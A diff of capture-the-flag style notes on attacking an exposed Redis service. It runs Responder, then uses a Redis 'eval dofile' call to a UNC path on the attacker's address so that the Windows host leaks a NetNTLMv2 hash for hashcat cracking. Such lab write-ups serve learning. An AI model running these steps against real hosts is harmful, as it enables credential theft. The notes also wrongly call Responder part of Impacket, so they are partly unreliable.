@@ -1,14 +1,3 @@
-Imapcket Responser.py
-----------------------
-
-Impacket is a collection of Python classes for working with network protocols, and Responder.py is one of the tools provided in this collection.
-
-Responder.py primarily focuses on analyzing and exploiting weaknesses in network authentication protocols such as NTLM (NT LAN Manager) and others. It operates by listening for certain network traffic, such as authentication requests, and then crafting responses to these requests in order to capture authentication credentials or perform other attacks.
-
-For that, we first set up a listener using Impacket's Responder.py
--------------------------------------------------------------------
-#sudo responder -I tun0
-
 6379/tcp  open  redis (redis port is open)
 
 
@@ -18,7 +7,7 @@ To find all configs in redis
 #redis-cli -h 10.10.245.19
 10.10.245.19:6379> config get * 
 
-We foudn the directory > "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
+We found the directory > "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
 
 To retrieve information from redis We can use luna script(dofile) with eval command 
 ------------------------------------------------------------------------------------
@@ -28,6 +17,16 @@ Then, we use the redis eval technique to access the exposed share.
 ------------------------------------------------------------------
 #redis-cli -h 10.10.245.19 eval "dofile('//10.11.60.43/test')" 0 
 
+Imapcket Responser.py 
+----------------------
+
+Impacket is a collection of Python classes for working with network protocols, and Responder.py is one of the tools provided in this collection.
+
+Responder.py primarily focuses on analyzing and exploiting weaknesses in network authentication protocols such as NTLM (NT LAN Manager) and others. It operates by listening for certain network traffic, such as authentication requests, and then crafting responses to these requests in order to capture authentication credentials or perform other attacks.
+
+For that, we set up a listener using Impacket's Responder.py
+-------------------------------------------------------------------
+#sudo responder -I tun0
 
 NetNTLMv2 (hashcat -m 5600)
 -----------
